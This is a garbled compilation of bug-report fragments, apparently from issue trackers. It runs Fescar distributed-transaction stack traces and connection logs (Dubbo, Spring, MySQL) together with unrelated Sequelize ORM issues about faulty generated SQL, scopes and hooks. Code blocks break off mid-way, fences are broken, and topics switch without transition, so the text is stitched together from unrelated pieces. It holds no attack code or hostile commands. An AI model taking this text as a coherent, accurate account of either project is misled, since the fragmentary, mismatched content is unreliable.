~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.config.dependencydescriptor.resolvecandidate(dependencydescriptor.java:251) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.defaultlistablebeanfactory.doresolvedependency(defaultlistablebeanfactory.java:1135) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.defaultlistablebeanfactory.resolvedependency(defaultlistablebeanfactory.java:1062) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.annotation.autowiredannotationbeanpostprocessor$autowiredfieldelement.inject(autowiredannotationbeanpostprocessor.java:583) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.annotation.injectionmetadata.inject(injectionmetadata.java:91) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.annotation.autowiredannotationbeanpostprocessor.postprocesspropertyvalues(autowiredannotationbeanpostprocessor.java:372) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.populatebean(abstractautowirecapablebeanfactory.java:1341) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:572) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:495) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractbeanfactory.lambda$dogetbean$0(abstractbeanfactory.java:317) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:222) [spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:315) [spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:199) [spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.defaultlistablebeanfactory.preinstantiatesingletons(defaultlistablebeanfactory.java:759) [spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.context.support.abstractapplicationcontext.finishbeanfactoryinitialization(abstractapplicationcontext.java:869) [spring-context-5.0.8.release.jar:5.0.8.release] at org.springframework.context.support.abstractapplicationcontext.refresh(abstractapplicationcontext.java:550) [spring-context-5.0.8.release.jar:5.0.8.release] at org.springframework.boot.springapplication.refresh(springapplication.java:762) [spring-boot-2.0.4.release.jar:2.0.4.release] at org.springframework.boot.springapplication.refreshcontext(springapplication.java:398) [spring-boot-2.0.4.release.jar:2.0.4.release] at org.springframework.boot.springapplication.run(springapplication.java:330) [spring-boot-2.0.4.release.jar:2.0.4.release] at com.sky.demo.account.accountapplication.main(accountapplication.java:22) [classes/:?] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[?:1.8.0_73] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[?:1.8.0_73] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[?:1.8.0_73] at java.lang.reflect.method.invoke(method.java:497) ~[?:1.8.0_73] at com.intellij.rt.execution.application.appmain.main(appmain.java:147) [idea_rt.jar:?]
@override public void decode(bytebuffer bytebuffer) { super.decode(bytebuffer); short xidlen = bytebuffer.getshort(); if (xidlen > 0) { byte[] bs = new byte[xidlen]; bytebuffer.get(bs); this.setxid(new string(bs, utf8)); } branchid = bytebuffer.getlong(); branchstatus = branchstatus.get(bytebuffer.get()); } @override public boolean decode(bytebuf in) { boolean s = super.decode(in); if (!s) { return s; } // these lost the decode of xid and branchid branchid = in.readlong(); branchstatus = branchstatus.get(in.readbyte()); return true; }
2019-04-17 21:23:52.358 info [retryrollbacking_1]com.alibaba.fescar.core.rpc.channelmanager.getchannel:358 -just got exactly the one [id: , l:/127.0.0.1:8091 - r:/127.0.0.1:64465] for dubbo-demo-order-service:127.0.0.1:64465
2019-04-17 21:23:52.370 info [retryrollbacking_1]com.alibaba.fescar.server.coordinator.defaultcore.doglobalrollback:282 -failed to rollback branch br:2009235322/2009235319
2019-04-17 21:23:52.370 error[nettyservernioworker_4_8]com.alibaba.fescar.core.rpc.netty.messagecodechandler.decode:114 -codec decode not found magic offset
2019-04-17 21:23:52.371 info [retryrollbacking_1]com.alibaba.fescar.core.rpc.channelmanager.getchannel:358 -just got exactly the one [id: , l:/127.0.0.1:8091 - r:/127.0.0.1:64465] for dubbo-demo-order-service:127.0.0.1:64465
[2019-04-17 15:51:04:660] [error] [method:com.alibaba.fescar.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommittrue(abstractdmlbaseexecutor.java:103)]
exception occur java.sql.sqlexception: com.alibaba.fescar.core.exception.transactionexception: response[transactionexception[2009212322]] at com.alibaba.fescar.rm.datasource.connectionproxy.recognizelockkeyconflictexception(connectionproxy.java:124) at com.alibaba.fescar.rm.datasource.connectionproxy.processglobaltransactioncommit(connectionproxy.java:173) at com.alibaba.fescar.rm.datasource.connectionproxy.commit(connectionproxy.java:150) at com.alibaba.fescar.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommittrue(abstractdmlbaseexecutor.java:93) at com.alibaba.fescar.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:56) at com.alibaba.fescar.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:85) at com.alibaba.fescar.rm.datasource.exec.executetemplate.execute(executetemplate.java:100) at com.alibaba.fescar.rm.datasource.exec.executetemplate.execute(executetemplate.java:46) at com.alibaba.fescar.rm.datasource.preparedstatementproxy.executeupdate(preparedstatementproxy.java:82) at org.springframework.jdbc.core.jdbctemplate.lambda$update$0(jdbctemplate.java:867) at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:617) at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:862) at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:917) at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:927) at com.alibaba.fescar.samples.dubbo.service.impl.accountserviceimpl.debit(accountserviceimpl.java:54) at org.apache.dubbo.common.bytecode.wrapper1.invokemethod(wrapper1.java) at org.apache.dubbo.rpc.proxy.javassist.javassistproxyfactory$1.doinvoke(javassistproxyfactory.java:47) at org.apache.dubbo.rpc.proxy.abstractproxyinvoker.invoke(abstractproxyinvoker.java:86) at org.apache.dubbo.config.invoker.delegateprovidermetadatainvoker.invoke(delegateprovidermetadatainvoker.java:56) at org.apache.dubbo.rpc.protocol.invokerwrapper.invoke(invokerwrapper.java:56) at com.alibaba.fescar.dubbo.transactionpropagationfilter.invoke(transactionpropagationfilter.java:60) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.exceptionfilter.invoke(exceptionfilter.java:63) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.monitor.support.monitorfilter.invoke(monitorfilter.java:88) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.timeoutfilter.invoke(timeoutfilter.java:42) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.protocol.dubbo.filter.tracefilter.invoke(tracefilter.java:79) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.contextfilter.invoke(contextfilter.java:78) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.genericfilter.invoke(genericfilter.java:138) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.classloaderfilter.invoke(classloaderfilter.java:38) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.echofilter.invoke(echofilter.java:39) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.protocol.dubbo.dubboprotocol$1.reply(dubboprotocol.java:108) at org.apache.dubbo.remoting.exchange.support.header.headerexchangehandler.handlerequest(headerexchangehandler.java:103) at org.apache.dubbo.remoting.exchange.support.header.headerexchangehandler.received(headerexchangehandler.java:200) at org.apache.dubbo.remoting.transport.decodehandler.received(decodehandler.java:51) at org.apache.dubbo.remoting.transport.dispatcher.channeleventrunnable.run(channeleventrunnable.java:57) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748)
caused by: com.alibaba.fescar.core.exception.transactionexception: response[transactionexception[2009212322]] at com.alibaba.fescar.rm.abstractresourcemanager.branchregister(abstractresourcemanager.java:69) at com.alibaba.fescar.rm.defaultresourcemanager.branchregister(defaultresourcemanager.java:90) at com.alibaba.fescar.rm.datasource.connectionproxy.register(connectionproxy.java:192) at com.alibaba.fescar.rm.datasource.connectionproxy.processglobaltransactioncommit(connectionproxy.java:171) ..
[2019-04-17 15:51:07:522] [error] [method:org.apache.dubbo.rpc.filter.exceptionfilter.onresponse(exceptionfilter.java:96)] [dubbo] got unchecked and undeclared exception which called by 172.16.12.214
service: com.alibaba.fescar.samples.dubbo.service.accountservice, method: debit, exception: org.springframework.jdbc.uncategorizedsqlexception: preparedstatementcallback; uncategorized sqlexception for sql [update account_tbl set money = money - ? where user_id = ?]; sql state [null]; error code [0]; com.alibaba.fescar.core.exception.transactionexception: response[transactionexception[2009212322]]; nested exception is java.sql.sqlexception: com.alibaba.fescar.core.exception.transactionexception: response[transactionexception[2009212322]], dubbo version: 2.7.0, current host: 172.16.12.214 org.springframework.jdbc.uncategorizedsqlexception: preparedstatementcallback; uncategorized sqlexception for sql [update account_tbl set money = money - ? where user_id = ?]; sql state [null]; error code [0]; com.alibaba.fescar.core.exception.transactionexception: response[transactionexception[2009212322]]; nested exception is java.sql.sqlexception: com.alibaba.fescar.core.exception.transactionexception: response[transactionexception[2009212322]] at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:89) at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:81) at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:81) at org.springframework.jdbc.core.jdbctemplate.translateexception(jdbctemplate.java:1444) at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:632) at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:862) at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:917) at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:927) at com.alibaba.fescar.samples.dubbo.service.impl.accountserviceimpl.debit(accountserviceimpl.java:54) at org.apache.dubbo.common.bytecode.wrapper1.invokemethod(wrapper1.java) at org.apache.dubbo.rpc.proxy.javassist.javassistproxyfactory$1.doinvoke(javassistproxyfactory.java:47) at org.apache.dubbo.rpc.proxy.abstractproxyinvoker.invoke(abstractproxyinvoker.java:86) at org.apache.dubbo.config.invoker.delegateprovidermetadatainvoker.invoke(delegateprovidermetadatainvoker.java:56) at org.apache.dubbo.rpc.protocol.invokerwrapper.invoke(invokerwrapper.java:56) at com.alibaba.fescar.dubbo.transactionpropagationfilter.invoke(transactionpropagationfilter.java:60) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.exceptionfilter.invoke(exceptionfilter.java:63) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.monitor.support.monitorfilter.invoke(monitorfilter.java:88) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.timeoutfilter.invoke(timeoutfilter.java:42) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.protocol.dubbo.filter.tracefilter.invoke(tracefilter.java:79) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.contextfilter.invoke(contextfilter.java:78) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.genericfilter.invoke(genericfilter.java:138) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.classloaderfilter.invoke(classloaderfilter.java:38) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.echofilter.invoke(echofilter.java:39) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.protocol.dubbo.dubboprotocol$1.reply(dubboprotocol.java:108) at org.apache.dubbo.remoting.exchange.support.header.headerexchangehandler.handlerequest(headerexchangehandler.java:103) at org.apache.dubbo.remoting.exchange.support.header.headerexchangehandler.received(headerexchangehandler.java:200) at org.apache.dubbo.remoting.transport.decodehandler.received(decodehandler.java:51) at org.apache.dubbo.remoting.transport.dispatcher.channeleventrunnable.run(channeleventrunnable.java:57) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748)
caused by: java.sql.sqlexception: com.alibaba.fescar.core.exception.transactionexception: response[transactionexception[2009212322]] at com.alibaba.fescar.rm.datasource.connectionproxy.recognizelockkeyconflictexception(connectionproxy.java:124) at com.alibaba.fescar.rm.datasource.connectionproxy.processglobaltransactioncommit(connectionproxy.java:173) at com.alibaba.fescar.rm.datasource.connectionproxy.commit(connectionproxy.java:150) at com.alibaba.fescar.rm.datasource.connectionproxy.setautocommit(connectionproxy.java:212) at com.alibaba.fescar.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommittrue(abstractdmlbaseexecutor.java:106) at com.alibaba.fescar.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:56) at com.alibaba.fescar.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:85) at com.alibaba.fescar.rm.datasource.exec.executetemplate.execute(executetemplate.java:100) at com.alibaba.fescar.rm.datasource.exec.executetemplate.execute(executetemplate.java:46) at com.alibaba.fescar.rm.datasource.preparedstatementproxy.executeupdate(preparedstatementproxy.java:82) at org.springframework.jdbc.core.jdbctemplate.lambda$update$0(jdbctemplate.java:867) at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:617) ..
caused by: com.alibaba.fescar.core.exception.transactionexception: response[transactionexception[2009212322]] at com.alibaba.fescar.rm.abstractresourcemanager.branchregister(abstractresourcemanager.java:69) at com.alibaba.fescar.rm.defaultresourcemanager.branchregister(defaultresourcemanager.java:90) at com.alibaba.fescar.rm.datasource.connectionproxy.register(connectionproxy.java:192) at com.alibaba.fescar.rm.datasource.connectionproxy.processglobaltransactioncommit(connectionproxy.java:171) ..
connected to fescar server when app server starting , i got this message ```
2019-04-17 14:38:45.745 [timeoutchecker_1] info com.alibaba.fescar.core.rpc.netty.nettypoolablefactory - nettypool create channel to transactionrole:tmrole,address:192.168.125.105:8091,msg:< registertmrequest{applicationid='my_test_tx_group', transactionservicegroup='my_test_tx_group'} >
2019-04-17 14:38:45.759 [timeoutchecker_1] info com.alibaba.fescar.core.rpc.netty.rmrpcclient - will connect to **192.168.125.105**:8091
2019-04-17 14:38:45.759 [timeoutchecker_1] info com.alibaba.fescar.core.rpc.netty.rmrpcclient - rm will register :null
2019-04-17 14:38:45.760 [timeoutchecker_1] info com.alibaba.fescar.core.rpc.netty.nettypoolablefactory - nettypool create channel to transactionrole:rmrole,address:192.168.125.105:8091,msg:< registerrmrequest{resourceids='null', applicationid='my_test_tx_group', transactionservicegroup='my_test_tx_group'} >
2019-04-17 14:38:45.996 [timeoutchecker_1] info com.alibaba.fescar.core.rpc.netty.nettypoolablefactory - register success, cost 27 ms, version:0.4.2,role:tmrole,channel:[id: , l:/192.168.125.185:52071 - r:/192.168.125.105:8091]
2019-04-17 14:38:45.996 [timeoutchecker_1] info com.alibaba.fescar.core.rpc.netty.rmrpcclient - register rm success
server version:0.4.2,channel:[id: , l:/192.168.125.185:52070 - r:/192.168.125.105:8091]
2019-04-17 14:38:45.997 [timeoutchecker_1] info com.alibaba.fescar.core.rpc.netty.nettypoolablefactory - register success, cost 35 ms, version:0.4.2,role:rmrole,channel:[id: , l:/192.168.125.185:52070 - r:/192.168.125.105:8091]
``` but i got error message when start global transaction ```
d=**172.18.0.1**:8091:2009211063
2019-04-17 14:38:56.811 [http-nio-8084-exec-3] info com.alibaba.fescar.core.rpc.netty.nettypoolablefactory - nettypool create channel to transactionrole:tmrole,address:**172.18.0.1**:8091,msg:< registertmrequest{applicationid='my_test_tx_group', transactionservicegroup='my_test_tx_group'} >
2019-04-17 14:38:57.863 [nettyclientselector_tmrole_1] info com.alibaba.fescar.core.rpc.netty.abstractrpcremoting - channelhandlercontext(tmrpcclient#0, [id: ]) will closed
2019-04-17 14:38:57.864 [http-nio-8084-exec-3] error com.alibaba.fescar.core.rpc.netty.tmrpcclient - get channel from pool error.
com.alibaba.fescar.common.exception.frameworkexception: can not connect to fescar-server
at com.alibaba.fescar.core.rpc.netty.abstractrpcremotingclient.getnewchannel(abstractrpcremotingclient.java:238) at com.alibaba.fescar.core.rpc.netty.nettypoolablefactory.makeobject(nettypoolablefactory.java:60) at com.alibaba.fescar.core.rpc.netty.nettypoolablefactory.makeobject(nettypoolablefactory.java:38) at org.apache.commons.pool.impl.generickeyedobjectpool.borrowobject(generickeyedobjectpool.java:1220) at com.alibaba.fescar.core.rpc.netty.tmrpcclient.doconnect(tmrpcclient.java:346) ```
``` /** * instantiates a new file based session manager
* * @param name the name * @param sessionstorefilepath the session store file path * @throws ioexception the io exception */ public filebasedsessionmanager(string name, string sessionstorefilepath) throws ioexception { super(name); transactionstoremanager = new filetransactionstoremanager(sessionstorefilepath + name, this); }
the full name is not right
![image]( ``` ```
### the error may involve defaultparametermap
### the error occurred while setting parameters
### sql: select pt.thing_property_tmplt_id, pt.name name, pt.name displayname, u.unit_symbol unitsymbol, tpt.data_type type, pt.default_value defaultvaue from t_thing_tmplt_property_group_rel_tmplt tr join t_thing_property_group_tmplt gt on gt.thing_property_group_tmplt_id = tr.property_group_tmplt_id left join t_thing_property_tmplt pt on pt.thing_property_group_tmplt_id = gt.thing_property_group_tmplt_id left join t_thing_property_type tpt on tpt.thing_property_type_id = pt.thing_property_type_id left join t_unit u on u.unit_id = tpt.unit_id where tr.thing_tmplt_id = ? and tr.organization_id = ? and pt.is_logic = 0 union all select pt.thing_property_tmplt_id, pt.name name, pt.name displayname, u.unit_symbol unitsymbol, tpt.data_type type, pt.default_value defaultvaue from t_thing_tmplt_property_group_rel_tmplt tr join t_thing_property_tmplt pt on pt.thing_property_tmplt_id = tr.property_tmplt_id left join t_thing_property_type tpt on tpt.thing_property_type_id = pt.thing_property_type_id left join t_unit u on u.unit_id = tpt.unit_id where tr.thing_tmplt_id = ? and tr.organization_id = ? and pt.is_logic = 0
### cause: java.lang.nullpointerexception] with root cause
java.lang.nullpointerexception: null
![image]( ```
2019-04-08 14:53:21.436 info [main]c.a.fescar.core.rpc.netty.abstractrpcremotingserver.start:153 -server started ..
exception in thread "main" java.lang.runtimeexception: java.lang.illegalargumentexception: hostname can\'t be null at com.alibaba.fescar.core.rpc.netty.abstractrpcremotingserver.start(abstractrpcremotingserver.java:158) at com.alibaba.fescar.core.rpc.netty.rpcserver.init(rpcserver.java:131) at servertest.main(servertest.java:46)
caused by: java.lang.illegalargumentexception: hostname can't be null at java.net.inetsocketaddress.checkhost(inetsocketaddress.java:149) at java.net.inetsocketaddress.<init>(inetsocketaddress.java:216) at com.alibaba.fescar.core.rpc.netty.abstractrpcremotingserver.start(abstractrpcremotingserver.java:154) ..
2019-04-08 14:53:21.452 info [shutdownhook]com.alibaba.fescar.core.rpc.netty.rpcserver.destroy:177 -destroyed rpcserver
asyncworker failed to do branchcommit, and left undolog.
`ifconfig -a` get ```
en0: flags=8863<up,broadcast,smart,running,simplex,multicast> mtu 1500 ether 78:4f:43:7b:f5:60 inet6 fe80::10dd:99a8:68a8:f0f5%en0 prefixlen 64 secured scopeid inet 10.3.18.53 netmask broadcast 10.3.23.255 nd6 options=201<performnud,dad> media: autoselect status: active
utun2: flags=8051<up,pointopoint,running,multicast> mtu 1380 inet6 fe80::c22e:1aef:e756:5c53%utun2 prefixlen 64 scopeid nd6 options=201<performnud,dad>
utun1: flags=8051<up,pointopoint,running,multicast> mtu 1500 inet 172.23.1.50 --> 172.23.1.49 netmask
not the en0 ![](
c p+port lient ort
``` ```
first method call
![image]( second method call, the xid that leaked by the first method call can still be achieved!!!
![image]( ![image](
you can run simple.java in my project if you would like to.
[ ![image]( ![image]( ```
15:22:38.261 [main] error com.alibaba.fescar.rm.datasource.exec.abstractdmlbaseexecutor - exception occur
com.mysql.jdbc.exceptions.jdbc4.mysqlsyntaxerrorexception: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near 'for update' at line 1 at sun.reflect.nativeconstructoraccessorimpl.newinstance0(native method) at sun.reflect.nativeconstructoraccessorimpl.newinstance(nativeconstructoraccessorimpl.java:57) at sun.reflect.delegatingconstructoraccessorimpl.newinstance(delegatingconstructoraccessorimpl.java:45) at java.lang.reflect.constructor.newinstance(constructor.java:526) at com.mysql.jdbc.util.handlenewinstance(util.java:425) at com.mysql.jdbc.util.getinstance(util.java:408) at com.mysql.jdbc.sqlerror.createsqlexception(sqlerror.java:944) at com.mysql.jdbc.mysqlio.checkerrorpacket(mysqlio.java:3978) at com.mysql.jdbc.mysqlio.checkerrorpacket(mysqlio.java:3914) at com.mysql.jdbc.mysqlio.sendcommand(mysqlio.java:2530) at com.mysql.jdbc.mysqlio.sqlquerydirect(mysqlio.java:2683) at com.mysql.jdbc.connectionimpl.execsql(connectionimpl.java:2491) at com.mysql.jdbc.connectionimpl.execsql(connectionimpl.java:2449) at com.mysql.jdbc.statementimpl.executequery(statementimpl.java:1381) at com.alibaba.druid.filter.filterchainimpl.statement_executequery(filterchainimpl.java:2831) at com.alibaba.druid.filter.filteradapter.statement_executequery(filteradapter.java:2503) at com.alibaba.druid.filter.filtereventadapter.statement_executequery(filtereventadapter.java:302) at com.alibaba.druid.filter.filterchainimpl.statement_executequery(filterchainimpl.java:2828) at com.alibaba.druid.proxy.jdbc.statementproxyimpl.executequery(statementproxyimpl.java:221) at com.alibaba.druid.pool.druidpooledstatement.executequery(druidpooledstatement.java:291) at com.alibaba.fescar.rm.datasource.exec.updateexecutor.beforeimage(updateexecutor.java:75) at com.alibaba.fescar.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommitfalse(abstractdmlbaseexecutor.java:49) at com.alibaba.fescar.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommittrue(abstractdmlbaseexecutor.java:64) at com.alibaba.fescar.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:42) at com.alibaba.fescar.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:50) at com.alibaba.fescar.rm.datasource.exec.executetemplate.execute(executetemplate.java:74) at com.alibaba.fescar.rm.datasource.exec.executetemplate.execute(executetemplate.java:32) at com.alibaba.fescar.rm.datasource.preparedstatementproxy.executeupdate(preparedstatementproxy.java:69) at org.springframework.jdbc.core.jdbctemplate$2.doinpreparedstatement(jdbctemplate.java:883) at org.springframework.jdbc.core.jdbctemplate$2.doinpreparedstatement(jdbctemplate.java:876) at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:639) at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:876) at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:937) at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:947) at com.tankilo.simple.transfer(simple.java:19) at com.tankilo.simple$$fastclassbyspringcglib$$4f474ecb.invoke(<generated>) at org.springframework.cglib.proxy.methodproxy.invoke(methodproxy.java:204) at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.invokejoinpoint(cglibaopproxy.java:736) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:157) at com.alibaba.fescar.spring.annotation.globaltransactionalinterceptor$1.execute(globaltransactionalinterceptor.java:56) at com.alibaba.fescar.tm.api.transactionaltemplate.execute(transactionaltemplate.java:52) at com.alibaba.fescar.spring.annotation.globaltransactionalinterceptor.invoke(globaltransactionalinterceptor.java:53) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:179) at org.springframework.aop.framework.cglibaopproxy$dynamicadvisedinterceptor.intercept(cglibaopproxy.java:671) at com.tankilo.simple$$enhancerbyspringcglib$$143a6530.transfer(<generated>) at com.tankilo.simple.main(simple.java:54)
: $extra_jvm_arguments
![image]( you can see, globalsession#branchsessions is not null ,but status is rollbacked
who is responsible for rolling back the global transaction after timeout, how to roll back?
rollback may make data dirty
if use `serverbootstrap#option()` set netty `so_keepalive` option, the `server` start will report following warn: ```
warn io.netty.bootstrap.serverbootstrap - unknown channel option 'so_keepalive' for channel
``` it's should replace with serverbootstrap#childoption()
unique constraints are being added that are not intended.
the hook simply never gets called
no error occurs when the hook is registered.
{ tableid: 'aa', owner: 'bb', type: 'cc', createdat: 2020-07-09t10:39:34.770z, updatedat: 2020-07-09t10:39:34.770z }
here is a query generated when `minifyaliases = true`: ```sql
select "id", end_date - interval \'1 month\' * coalesce(notice_period,0) as "_0" from "users" as "user" order by cancellation_date;
``` attribute `end_date - interval ...` aliased as `_0`, while it is not aliased in `order by`
obviously it leads to error: `column "cancellation_date" does not exist`.
the generated query tries to convert column into type `virtual` which does not exist in postgresql: ```sql
alter table "users" alter column "searchfilter" drop not null;
alter table "users" alter column "searchfilter" drop default;
alter table "users" alter column "searchfilter" type virtual;
error: type "virtual" does not exist
the id values differ between subsequent runs
// local test output v6.1.0 w/ sqlite
f1.id: 79355efc-68a1-4935-b97f-03b8f2012730
f2.id: 46279f95-f88c-4325-8c58-d0a1237824c1
_the options object now have a reference to "model" object._ ``` ```
check the generated sql example below that throws the error for more information
select `productgroup`.*, `screenshots`.`id` as `screenshots.id`, `screenshots`.`name` as `screenshots.name` from (select `productgroup`.`id` as `id`, /* duplication */ `productgroup`.`name` as `name`, `productgroup`.`id` /* duplication */ from `productgroup` as `productgroup` where `productgroup`.`id` = 1 limit 1) as `productgroup` left outer join `screenshot` as `screenshots` on `productgroup`.`id` = `screenshots`.`productgroupid` ```
it seems that the default scope is overridden
in the `reload` function, if not `include` is passed, it is set to `null` by default.
the `updatedat` field cannot be updated manually for sequelize >= 5
this is a breaking change and i did not find any options to revert that behavior.
an error message was output ```
s.replace is not a function
console.log(results[0].id);
// undefined
console.log(results[0].primarykey);
error log contains: `cls is losed
expected: 2
an sql query with syntax errors is produced ```sql select ..
from `model` as `model` group by;
result has no data in it, but it does have the new record if i change the querytype to select
unhandled rejection error: named bind parameter "$dim" has no value in the given object
_all messages related to alter and drop are not logged to the logging hook!_ ```
sync executing (default): create table if not exists `users` (`id` bigint auto_increment , `username` varchar(255) not null unique, `password` varchar(255) not null, `createdat` datetime not null, `updatedat`
datetime not null, primary key (`id`)) engine=innodb;
global executing (default): show full columns from `users`;
global executing (default): select constraint_name as constraint_name,constraint_name as constraintname,constraint_schema as constraintschema,constraint_schema as constraintcatalog,table_name as tablename,table_schema as tableschema,table_schema as tablecatalog,column_name as columnname,referenced_table_schema as referencedtableschema,referenced_table_schema as referencedtablecatalog,referenced_table_name as referencedtablename,referenced_column_name as referencedcolumnname from information_schema.key_column_usage where table_name = 'users' and constraint_name!='primary' and constraint_schema='test-schema' and referenced_table_name is not null;
global executing (default): alter table `users` change `username` `username` varchar(255) not null unique;
global executing (default): alter table `users` change `password` `password` varchar(255) not null;
global executing (default): alter table `users` change `createdat` `createdat` datetime not null;
global executing (default): alter table `users` change `updatedat` `updatedat` datetime not null;
sync executing (default): show index from `users`
_the output was:_ ```
[ 'franchesko totti' ]
the generated query was:
select `players`.`id`, `players`.`name`, `players`.`teamid`, `team`.`id` as `team.id`, `team`.`name` as `team.name`
from `players` as `players`
inner join `teams` as `team` on `players`.`teamid` = `team`.`id` and `team`.`name` = 'roma';
``` ### additional info what is interesting is that if you swipe the scopes in the previous query there is no problem:
await player.scope(['team', 'children', { method: ['teambyname', 'roma'] }]).findall({ where: {},
if you remove the 'children' scope again the problem is solved
why would the 'children' scope has anything to do with the next query which does not even use it?
await player.scope(['team', { method: ['teambyname', 'roma'] }]).findall({ where: {},
this makes me think that when these scopes are ordered in specific way they leave scope polluted for the next queries
as a result the next generated query is wrong
this is very strange because the previous query has influence on the next and what is worse the order of the scopes is important.
the output misses the required parentheses enclosing the function calls, as seen below: ```
executing (default): create table if not exists `foos` (
